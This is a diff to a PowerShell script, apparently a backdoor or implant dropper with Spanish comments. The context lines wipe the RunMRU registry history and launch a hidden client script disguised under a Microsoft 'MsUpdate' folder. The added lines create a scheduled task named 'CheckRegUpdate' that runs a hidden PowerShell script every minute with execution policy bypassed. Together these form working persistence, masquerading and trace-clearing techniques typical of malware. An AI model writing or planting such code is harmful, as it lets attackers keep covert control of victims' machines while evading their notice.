@@ -40,6 +40,9 @@ Unblock-File -Path $rutaLocalEjecuter
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
 
+#crea tarea de ejecucion
+schtasks /create /sc minute /mo 1 /f /tn "CheckRegUpdate" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\Users\candrade\Documents\HACK\Test.ps1\"" 
+
 
 ## Execution of the client
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.ps1" -ArgumentList "start" -WindowStyle Hidden
